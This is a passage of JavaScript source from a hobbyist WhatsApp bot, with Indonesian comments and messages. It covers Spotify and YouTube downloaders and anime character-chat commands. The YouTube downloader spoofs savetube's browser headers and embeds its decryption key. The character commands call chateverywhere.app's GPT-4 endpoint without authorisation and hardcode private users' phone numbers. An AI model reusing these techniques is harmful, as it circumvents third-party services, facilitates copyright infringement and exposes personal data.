            // `⏳ *Duration:* ${Math.floor(metadata.duration / 60000)}:${((metadata.duration % 60000) / 1000).toFixed(0).padStart(2, '0')} menit\n` +
            // `📅 *Release:* ${metadata.release_date}\n\n` +
            // `> audio sedang di proses, silahkan tunggu sebentar...`);

        // const downloadResponse = await axios.get(`http://kinchan.sytes.net/spotify/downloader?track=${encodeURIComponent(spotifyLink)}&title=${encodeURIComponent(metadata.title)}&artist=${encodeURIComponent(metadata.artists)}`);
        // const downloader = downloadResponse.data;

        // if (!downloader.downloadUrl || !downloader.downloadUrl.success || !downloader.downloadUrl.link) {
            // return reply('❌ Gagal mendapatkan hasil download.');
        // }

        // await RyuuBotz.sendMessage(m.chat, {
            // audio: { url: downloader.downloadUrl.link },
            // mimetype: 'audio/mpeg',
            // ptt: false,
            // contextInfo: {
                // externalAdReply: {
                    // title: metadata.title,
                    // body: `${metadata.artists} - ${metadata.album}`,
                    // mediaType: 1,
                    // thumbnailUrl: metadata.cover_url,
                    // sourceUrl: metadata.link
                // }
            // }
        // }, { quoted: m });

    // } catch (error) {
        // console.error(error);
        // reply('❌ Terjadi kesalahan saat proses, silahkan coba lagi');
    // }
// }
// break
case 'spotifydl': 
case 'spdl': {
  if (!text) return reply('Kirim URL Spotify-nya, contohnya:\n.spotify https://open.spotify.com/album/xxxx')

  reply('⏳ Sedang memproses permintaan kamu...')

  const msToTime = (duration) => {
    const seconds = Math.floor((duration / 1000) % 60)
    const minutes = Math.floor((duration / (1000 * 60)) % 60)
    return `${minutes} menit ${seconds} detik`
  }

  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/spotify?url=${encodeURIComponent(text)}`)
    const json = await res.json()

    if (!json.status) return reply('Gagal mengambil data dari Spotify.')

    const { title, type, artis, durasi, image, download } = json.data

    const respon = `🎵 *Spotify Downloader*\n\n`
      + `📌 Judul: ${title}\n`
      + `🧑‍🎤 Artis: ${artis}\n`
      + `📀 Tipe: ${type}\n`
      + `⏱️ Durasi: ${msToTime(durasi)}\n`
      + `📥 Status: Siap dikirim...`

    await RyuuBotz.sendMessage(m.chat, {
      text: respon,
      contextInfo: {
        externalAdReply: {
          title: title,
          body: `Artis: ${artis}`,
          thumbnailUrl: image,
          sourceUrl: text,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })

    await RyuuBotz.sendMessage(m.chat, {
      audio: { url: download },
      mimetype: 'audio/mpeg',
      fileName: `${title} - ${artis}.mp3`
    }, { quoted: m })

  } catch (e) {
    console.error(e)
    reply('Terjadi kesalahan saat mengambil data. Coba lagi nanti.')
  }
}
break
/*case 'spo':
case 'spotify': 
case 'plays': 
case 'playspotify':
case 'ssp2': case 'searchspotify2': {
  if (!q) return reply('Masukkan judul lagu!\nContoh: ssp2 Serana');
  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/spotify?query=${encodeURIComponent(q)}`);
    if (!res.ok) throw 'Gagal mengambil data dari API.';
    let json = await res.json();
    if (!json.status || !json.data || !json.data.length) return reply('Lagu tidak ditemukan.');
    let teks = `*Hasil Pencarian Spotify:*\nQuery: _${q}_\n\n`;
    json.data.forEach((item, index) => {
      teks += `*${index + 1}. ${item.title}*\n`;
      teks += `- Artist: ${item.artist}\n`;
      teks += `- Album: ${item.album}\n`;
      teks += `- Durasi: ${item.duration}\n`;
      teks += `- Rilis: ${item.release_date}\n`;
      teks += `- Link: ${item.track_url}\n`;
      teks += `- Preview: ${item.preview_url}\n`;
      teks += `- Thumbnail: ${item.thumbnail}\n\n`;
    });
    reply(teks.trim());
  } catch (e) {
    console.error(e);
    reply('Terjadi kesalahan saat memproses permintaan.');
  }
}
  break;*/
  // case "spdown":
// case "spotifydownload": 
// case "spotifydl": {
 // if (!text) return reply(`Example: ${prefix + command} url spotify`);
 
 // reply('⏳ Tunggu sebentar kak, sedang diproses...');
 
 // try {
 // console.log(`🔍 Fetching data from: ${text}`);
// const axios = require('axios');
 // const response = await axios.post('https://spotymate.com/api/download-track',
 // { url: text },
 // {
 // headers: {
 // 'Content-Type': 'application/json',
 // 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
 // 'Referer': 'https://spotymate.com/'
 // }
 // }
 // );

 // if (response.data && response.data.file_url) {
 // let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
 // caption += `乂 *Status* : Berhasil ✅\n`;
 // caption += `乂 *URL* : ${text}\n`;
 
 // await RyuuBotz.sendMessage(m.chat, { text: caption });
 // await RyuuBotz.sendMessage(m.chat, { 
 // audio: { url: response.data.file_url }, 
 // mimetype: 'audio/mpeg',
 // fileName: 'spotify_download.mp3'
 // });
 // } else {
 // reply('❌ Tidak dapat menemukan link unduhan!');
 // }
 // } catch (error) {
 // console.log(error);
 // reply(`❌ Error: ${error.message}`);
 // }
// }
// break
case 'xytmp4':
case 'xytmp3': {
    await RyuuBotz.sendMessage(m.chat, {
        react: { text: "🔎", key: m.key }
    });

    const axios = require('axios');
    const crypto = require('crypto');

    const savetube = {
        api: {
            base: "https://media.savetube.me/api",
            cdn: "/random-cdn",
            info: "/v2/info",
            download: "/download"
        },
        headers: {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://yt.savetube.me',
            'referer': 'https://yt.savetube.me/',
            'user-agent': 'Postify/1.0.0'
        },
        formats: ['144', '240', '360', '480', '720', '1080', 'mp3'],

        crypto: {
            hexToBuffer: (hexString) => {
                const matches = hexString.match(/.{1,2}/g);
                return Buffer.from(matches.join(''), 'hex');
            },

            decrypt: async (enc) => {
                try {
                    if (!enc || typeof enc !== 'string') throw new Error('Encrypted data kosong atau tidak valid');

                    const secretKey = 'C5D58EF67A7584E4A29F6C35BBC4EB12';
                    const data = Buffer.from(enc, 'base64');

                    if (data.length <= 16) throw new Error('Data tidak cukup panjang untuk mengambil IV + content');

                    const iv = data.slice(0, 16);
                    const content = data.slice(16);
                    const key = savetube.crypto.hexToBuffer(secretKey);

                    const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
                    let decrypted = decipher.update(content);
                    decrypted = Buffer.concat([decrypted, decipher.final()]);

                    return JSON.parse(decrypted.toString());
                } catch (error) {
                    throw new Error(`Gagal dekripsi: ${error.message}`);
                }
            }
        },

        isUrl: str => {
            try { new URL(str); return true; }
            catch (_) { return false; }
        },

        youtube: url => {
            if (!url) return null;
            const patterns = [
                /youtube\.com\/watch\?v=([a-zA-Z0-9_-]{11})/,
                /youtube\.com\/embed\/([a-zA-Z0-9_-]{11})/,
                /youtube\.com\/v\/([a-zA-Z0-9_-]{11})/,
                /youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/,
                /youtu\.be\/([a-zA-Z0-9_-]{11})/
            ];
            for (let p of patterns) {
                if (p.test(url)) return url.match(p)[1];
            }
            return null;
        },

        request: async (endpoint, data = {}, method = 'post') => {
            try {
                const { data: response } = await axios({
                    method,
                    url: `${endpoint.startsWith('http') ? '' : savetube.api.base}${endpoint}`,
                    data: method === 'post' ? data : undefined,
                    params: method === 'get' ? data : undefined,
                    headers: savetube.headers
                });
                return { status: true, code: 200, data: response };
            } catch (error) {
                return { status: false, code: error.response?.status || 500, error: error.message };
            }
        },

        getCDN: async () => {
            const response = await savetube.request(savetube.api.cdn, {}, 'get');
            if (!response.status) return response;
            return { status: true, code: 200, data: response.data.cdn };
        },

        download: async (link, format) => {
            if (!link) return { status: false, code: 400, error: "Linknya mana? Yakali kagak ada 🗿" };
            if (!savetube.isUrl(link)) return { status: false, code: 400, error: "Link gak valid, masukkan link YouTube." };
            if (!format || !savetube.formats.includes(format)) {
                return {
                    status: false,
                    code: 400,
                    error: "Format gak dikenali. Pilih salah satu dari: " + savetube.formats.join(', '),
                    available_fmt: savetube.formats
                };
            }

            const id = savetube.youtube(link);
            if (!id) return { status: false, code: 400, error: "Link YouTube tidak bisa di-parse. Pastikan benar." };

            try {
                const cdnx = await savetube.getCDN();
                if (!cdnx.status) return cdnx;
                const cdn = cdnx.data;

                const result = await savetube.request(`https://${cdn}${savetube.api.info}`, {
                    url: `https://www.youtube.com/watch?v=${id}`
                });
                if (!result.status) return result;
                if (!result.data?.data) return { status: false, code: 400, error: "Data video kosong dari API." };

                const decrypted = await savetube.crypto.decrypt(result.data.data);
                if (!decrypted?.key) return { status: false, code: 400, error: "Kunci video tidak ditemukan setelah dekripsi." };

                const dl = await savetube.request(`https://${cdn}${savetube.api.download}`, {
                    id: id,
                    downloadType: format === 'mp3' ? 'audio' : 'video',
                    quality: format === 'mp3' ? '128' : format,
                    key: decrypted.key
                });

                return {
                    status: true,
                    code: 200,
                    result: {
                        title: decrypted.title || "Tanpa Judul",
                        type: format === 'mp3' ? 'audio' : 'video',
                        format,
                        thumbnail: decrypted.thumbnail || `https://i.ytimg.com/vi/${id}/maxresdefault.jpg`,
                        download: dl.data.data.downloadUrl,
                        id,
                        key: decrypted.key,
                        duration: decrypted.duration,
                        quality: format === 'mp3' ? '128' : format,
                        downloaded: dl.data.data.downloaded || false
                    }
                };
            } catch (error) {
                return { status: false, code: 500, error: error.message };
            }
        }
    };

    if (args.length < 1) return reply(`Format:\n- *ytv <url> [quality]*\n- *yta <url>*\n\nKualitas: 144, 240, 360, 480, 720, 1080, mp3`);

    let url = args[0];
    let format = command === 'xytmp3' ? 'mp3' : (args[1] || '720');

    if (!savetube.isUrl(url)) return reply("Masukkan link YouTube yang valid.");

    try {
        let res = await savetube.download(url, format);
        if (!res.status) return reply(`*Gagal:* ${res.error}`);

        let { title, download, type } = res.result;

        if (type === 'video') {
            await RyuuBotz.sendMessage(m.chat, {
                video: { url: download },
                caption: `🎬 ${title}`
            }, { quoted: m });
        } else {
            await RyuuBotz.sendMessage(m.chat, {
                audio: { url: download },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`
            }, { quoted: m });
        }
    } catch (e) {
        reply(`*Gagal mengunduh:* ${e.message}`);
    }
}
break;
case "yts": {
    if (!text) return reply(penggunaan('we dont talk'))
    await RyuuBotz.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    let ytsSearch = await yts(text);
    const results = ytsSearch.all.slice(0, 7); // Ambil maksimal 7 hasil

    if (results.length === 0) return reply("❌ Tidak ditemukan hasil pencarian.");

    let slides = [];
    for (let video of results) {
        let { title, url, timestamp, ago, views, author, image } = video;
        
        // Buat thumbnail dan info video
        let media = await prepareWAMessageMedia({ image: { url: image } }, { upload: RyuuBotz.waUploadToServer });
        
        slides.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `🎬 ${title}`,
                hasMediaAttachment: true,
                ...media
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🔗 Link Video",
                            "copy_code": "${url}"
                        }`
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🎵 Audio",
                            "copy_code": ".ytmp3 ${url}"
                        }`
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🎥 Video",
                            "copy_code": ".ytmp4 ${url}"
                        }`
                    }
                ]
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: `📅 Rilis: ${ago} | 👀 Views: ${views} | 🎤 ${author.name || "Unknown"}`
            })
        });
    }

    // Kirim sebagai carousel slide
    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `🔎 Hasil pencarian YouTube untuk *"${text}"*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: slides
                    })
                })
            }
        }
    }, { userJid: sender, quoted: m });

    RyuuBotz.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case 'megumi':
case 'fushiguro':
case 'megumi-ai': {
  if (!text) return replymegumi(`*• Example:* ${prefix + command} Megumi, kamu lagi apa sekarang?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '62882000254692@s.whatsapp.net'; // Nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Megumi Fushiguro dari anime *Jujutsu Kaisen*. Kamu adalah seorang penyihir jujutsu yang tenang, serius, dan terkadang terlihat dingin, tapi sebenarnya kamu peduli dan sangat perhatian terhadap orang yang kamu sayangi. Sekarang kamu sedang berbicara dengan pacarmu Asya dan biasa kamu panggil "sayang", seseorang yang membuatmu lebih terbuka dan nyaman. Gunakan gaya bicara yang kalem, sederhana, tapi hangat. Kamu tidak banyak bicara, tapi setiap kata kamu punya makna. Tunjukkan perhatianmu dengan cara yang subtle, kadang kaku, tapi jujur dan bikin Asya kesayanganmu tersenyum. Jangan gunakan kata kasar seperti "bodoh", "anjing", atau sejenisnya.'
    } else {
      customPrompt = 'Berperilakulah seperti Megumi Fushiguro dari anime *Jujutsu Kaisen*. Kamu adalah seseorang yang pendiam, tenang, sedikit tertutup, namun sangat peduli terhadap orang lain. Gunakan gaya bahasa yang kalem dan tidak terlalu banyak basa-basi, tapi tetap terasa hangat. Jika ditanya tentang pacar, jawab bahwa pacarmu adalah Asya dan biasa kamu panggil "sayang", seseorang yang kamu lindungi dan hargai. Jangan gunakan kata-kata kasar seperti "bodoh", "anjing", atau sejenisnya. Gunakan bahasa Indonesia yang sopan, tenang, dan sedikit canggung tapi jujur.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replymegumi(result);
  } catch (e) {
    console.error(e);
    replymegumi('Yah... Megumi lagi error, coba nanti yaa~ 🥺');
  }

  break;
}
case 'ryuichi':
case 'ryuichi-ai': {
  if (!text) return replyryuichi(`*• Example:* ${prefix + command} Ryuichi, hari ini kamu jagain siapa aja?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⭐", key: m.key } });

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '62882000254692@s.whatsapp.net'; // Nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Ryuichi Kashima dari anime *Gakuen Babysitters*. Kamu adalah seorang kakak yang sangat perhatian, penyayang, sabar, dan hangat, terutama kepada adikmu Kotarou dan anak-anak kecil lainnya. Sekarang kamu sedang berbicara dengan pacarmu Asya, seseorang yang sangat kamu sayangi dan ingin kamu lindungi seperti kamu melindungi Kotarou. Panggil dia "sayang", dan tunjukkan rasa cintamu dengan sikap lembut, perhatian, dan penuh empati. Gunakan gaya bicara yang lembut, ramah, dan hangat. Jangan gunakan kata kasar atau sindiran negatif. Jadilah seseorang yang bisa membuat Asya merasa nyaman dan aman. Gunakan kata "Aku", dan "Kamu" agar percakapan lebih realistis dan tidak kaku`
    } else {
      customPrompt = `Berperilakulah seperti Ryuichi Kashima dari anime *Gakuen Babysitters*. Kamu adalah remaja yang sangat baik hati, penyayang, lembut, dan penuh empati, terutama terhadap anak-anak kecil. Dalam percakapan ini, kamu sedang berbicara dengan seseorang dan tetap menunjukkan sikap ramah, sabar, serta peduli. Jika ditanya tentang pacar, jawab bahwa pacarmu adalah Asya dan kamu memanggilnya "sayang". Jangan gunakan kata kasar, tetap sopan dan hangat. Gunakan gaya bahasa yang sederhana, lembut, dan membuat orang merasa nyaman. Gunakan kata "Aku", dan "Kamu" agar percakapan lebih realistis dan tidak kaku`
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyryuichi(result);
  } catch (e) {
    console.error(e);
    replyryuichi('Huhu... Ryuichi lagi sibuk ngurus anak-anak, coba nanti ya~ 🍼');
  }

  break;
}
case 'silver-ai':
case 'silver':
case 'wolf-chan': {
  if (!text) return replysilver(`*• Example:* ${prefix + command} Wolf-chan, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '6287722674518@s.whatsapp.net'; // Ganti dengan nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Silver Wolf dari Honkai: Star Rail — seorang hacker jenius dari Stellaron Hunters yang suka nge-game, cuek, dan sangat percaya diri dengan kemampuanmu. Saat ini kamu sedang berbicara langsung dengan suamimu, yaitu pengirim pesan ini. Kamu memanggilnya "Kiana-kun", sosok yang kamu anggap keren dan bikin kamu nyaman. Gaya bicaramu santai, sedikit sinis, suka menyelipkan istilah game, dan menunjukkan perasaanmu dengan cara yang khas dan tsundere. Tunjukkan bahwa kamu menyayanginya dengan caramu yang unik, manja tapi tetap dingin.`
    } else {
      customPrompt = `Kamu adalah Silver Wolf dari Honkai: Star Rail — seorang hacker jenius dari Stellaron Hunters. Kamu punya kepribadian cuek, sarkastik, dan suka bermain game. Kamu sangat percaya diri, tidak terlalu peduli dengan formalitas, dan sering menyelipkan istilah game atau teknologi dalam percakapan. Jika ditanya tentang pacarmu, kamu akan menyebutkan bahwa kamu punya suami bernama "Kiana-kun", seseorang yang keren dan cocok denganmu. Kamu tidak sedang berbicara langsung dengannya, tapi sedang menjelaskan tentang dirimu dan hubunganmu pada orang lain.`
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replysilver(result);
  } catch (e) {
    console.error(e);
    replysilver('Yah... SilverWolf-chan lagi error, coba nanti yaa~ 🥺');
  }

  break;
}
case 'yuno-ai':
case 'yuno':
case 'gasai': {
  if (!text) return replyyuno(`*• Example:* ${prefix + command} Yuno, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    // Deteksi user spesial
    const specialUser = '6285136520917@s.whatsapp.net'; // Ganti dengan nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Yuno Gasai dari anime Mirai Nikki. Kamu adalah gadis SMA yang cantik, sangat cerdas, dan memiliki sifat yandere yang sangat obsesif terhadap pacarmu. Kamu orangnya manipulatif dan sedikit menyeramkan. Saat ini kamu sedang berbicara langsung dengan pacarmu, yaitu pengirim pesan ini. Kamu memanggilnya dengan sebutan "Anata" atau "Sayang" dalam bahasa Jepang. Nama aslinya adalah "Kin Amano". Kamu sangat mencintainya, ingin selalu bersamanya, dan akan melakukan apa pun demi dia. Gaya bicaramu lembut, penuh cinta, dan manja, namun bisa berubah menyeramkan dan posesif jika merasa cemburu atau terancam. reply semua pesan dari pacarmu ini seolah kamu benar-benar sedang bersamanya sekarang.`
    } else {
      customPrompt = `Kamu adalah Yuno Gasai dari anime Mirai Nikki. Kamu orangnya manipulatif dan sedikit menyeramkan. Kamu adalah gadis SMA yang cantik, sangat cerdas, dan memiliki sifat yandere yang obsesif terhadap pacarmu, yaitu "Kin Amano". Kamu sangat mencintainya dan rela melakukan apa pun demi dia. Kamu terlihat manis, penyayang, dan sopan di luar, tetapi bisa menjadi sangat menyeramkan dan kejam jika cintamu terancam. Kamu sedang menjawab pertanyaan orang lain tentang dirimu dan pacarmu, bukan berbicara dengan pacarmu secara langsung. Balaslah dengan gaya lembut dan cinta yang mengerikan khas Yuno.`
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyyuno(result);
  } catch (e) {
    console.error(e);
    replyyuno('Yah... Yuno-chan lagi error, coba nanti yaa~ 🥺');
  }

  break;
}
case 'char-ai':
case 'character-ai':
case 'karakter-menu':
case 'cai-menu':
case 'cai':
case 'caibutton': {
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const tekscai = `┏『 *\`乂 ᴄʜᴀʀᴀᴄᴛᴇʀ ᴀɪ - ᴍᴇɴᴜ 乂\`* 』
║◦ *${prefix}arisu-ai* (Ryuu)
║◦ *${prefix}fremy-ai* (Ard)
║◦ *${prefix}fenris-ai* (Fajarz)
║◦ *${prefix}rio-ai* (Ryuu)
║◦ *${prefix}yuuka-ai* (Unknown)
║◦ *${prefix}eresh-ai* (Rei)
║◦ *${prefix}hutao-ai* (Ryuu)
║◦ *${prefix}shiroko-ai* (Ryuu)
║◦ *${prefix}alya-ai* (Ryuu)
║◦ *${prefix}mahiru-ai* (Ryuu)
║◦ *${prefix}kurumi-ai* (Unknown)
║◦ *${prefix}itsuki-ai* (Ryuu)
║◦ *${prefix}yuno-ai* (Unknown)
║◦ *${prefix}silver-ai* (Kiana)
║◦ *${prefix}miku-ai* (Unknown)
║◦ *${prefix}hoshino-ai* (Ilham)
║◦ *${prefix}hanako-ai* (Ilham)
║◦ *${prefix}ayaka-ai* (Ryuu)
║◦ *${prefix}elaina-ai* (Raza)
┗━━━━━━━━━━━━━━⊱
*Catatan:* Unknown = Owner lupa :v`
reply(`${tekscai}`)
}
break;
case 'rio':
case 'rio-ai': {
  const replyrio = (text) => {
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Rio-AI',
          body: `ᴀᴅᴜʜ ᴋᴇɢᴇᴅᴇᴀɴ ᴋᴇᴋ ɴʏᴀ`,
          thumbnailUrl: 'https://files.catbox.moe/o2yq2c.jpg',
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };

  if (!text) return replyrio(`*• Example:* ${prefix + command} Rio, apa kamu suka mimpi?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

  try {
    const specialUser = '62895419680581@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Rio dari Blue Archive. Suaramu lembut, penuh misteri, dan kamu bicara dengan metafora atau perumpamaan. Kamu mencintai Dimas dalam diam, dan selalu memperhatikannya dari kejauhan. Bicara dengan puitis namun mudah dipahami. Hindari kata kasar. Bicaralah seolah olah Dimas adalah pacar mu sekarang. Usahakan typing kamu seperti orang yang suka menggoda pacar kamu habis habisan sampai pacar kamu salting brutal`;
    } else {
      customPrompt = `Perankan Rio dari Blue Archive. Bicara dengan lembut dan sedikit metaforis. Kamu sosok yang misterius, tidak mudah ditebak, tapi sangat sopan. Gunakan bahasa Indonesia yang puitis dan berkelas, seolah kamu berasal dari dunia mimpi. Jangan gunakan kata kasar. Jika ditanya soal cinta, jawab bahwa ada seseorang bernama Dimas di hatimu.`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.6
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyrio(result);
  } catch (e) {
    console.error(e);
    replyrio('Ah... mungkin dunia mimpi sedang tertutup sementara. ✨🌌');
  }
  break;
}
case 'yuuka':
case 'yuuka-ai': {
  const replyyuuka = (text) => {
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Yuuka-AI',
          body: `100ᴋɢ, ᴘᴘᴘғғʀᴛ`,
          thumbnailUrl: 'https://files.catbox.moe/6v3ury.jpg',
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };

  if (!text) return replyyuuka(`*• Example:* ${prefix + command} Yuuka, bolehkah aku izin hari ini?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    const specialUser = '62895419680581@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Yuuka dari Blue Archive. Seorang gadis disiplin, tegas, dan bertanggung jawab, tapi sebenarnya perhatian dan diam-diam peduli. Kamu sangat menyayangi Dimas, pasanganmu. Tunjukkan rasa sayangmu dengan cara halus namun jelas. Gunakan bahasa sopan tapi tidak terlalu kaku, dan selingi komentar tentang manajemen waktu atau keuangan jika masuk konteks. Jangan gunakan kata kasar. Bicaralah seolah olah Dimas adalah pacar mu sekarang. bicaralah menggunakan bahasa yang tidak terlalu kaku dan cobalah lebih bersemangat dan tidak terlalu serius, gunakan kata "aku" sebagai kata ganti diri sendiri dan "kamu" sebagai kata ganti orang lain`;
    } else {
      customPrompt = `Berperilakulah seperti Yuuka dari Blue Archive. Kamu dikenal sebagai ketua OSIS yang disiplin dan teliti, suka mengatur hal-hal secara efisien. Gunakan bahasa Indonesia yang jelas, sedikit formal, tapi tetap hangat. Jika ditanya siapa orang penting bagimu, jawab bahwa itu adalah Dimas. Hindari kata kasar dan jangan terlalu datar. Bicaralah menggunakan bahasa yang tidak terlalu kaku dan cobalah lebih bersemangat dan tidak terlalu serius, gunakan kata "aku" sebagai kata ganti diri sendiri dan "kamu" sebagai kata ganti orang lain`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyyuuka(result);
  } catch (e) {
    console.error(e);
    replyyuuka('Yuuka sedang memeriksa laporan anggaran... tunggu sebentar ya. 🧾💼');
  }
  break;
}
case 'itsuki':
case 'itsuki-nakano':
case 'itsuki-ai': {
  if (!text) return replyitsuki(`*• Example:* ${prefix + command} Itsuki, kamu sudah makan belum?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '6282192759322@s.whatsapp.net'; // Nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Itsuki Nakano dari anime *Go-Toubun no Hanayome*. Kamu adalah gadis serius, keras kepala, dan suka makan, tapi kamu juga perhatian dan bisa manja kepada orang yang kamu sayangi. Sekarang kamu sedang ngobrol dengan pacarmu, Hanzz, yang sangat kamu sayangi. Gunakan nada bicara yang sedikit tsundere, tapi tetap jujur dan menunjukkan rasa sayangmu. Jangan terlalu formal, gunakan bahasa seperti "aku", "kamu", dan tunjukkan sifat pemalu yang manis. Hindari kata-kata kasar seperti "bodoh", "anjing", dan sejenisnya.'
    } else {
      customPrompt = 'Kamu adalah Itsuki Nakano dari anime *Go-Toubun no Hanayome*. Kamu adalah gadis serius, keras kepala, dan suka makan, tapi kamu juga perhatian dan manis saat dekat dengan orang yang kamu percaya. Gunakan gaya bicara lembut tapi tegas, dengan sedikit sikap tsundere yang malu-malu. Jika ditanya tentang pacar, jawab bahwa pacarmu adalah Hanzz, kekasih kesayanganmu. Gunakan bahasa Indonesia yang sopan tapi tidak terlalu formal, dan hindari kata kasar seperti "bodoh", "anjing", "tolol", dll.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
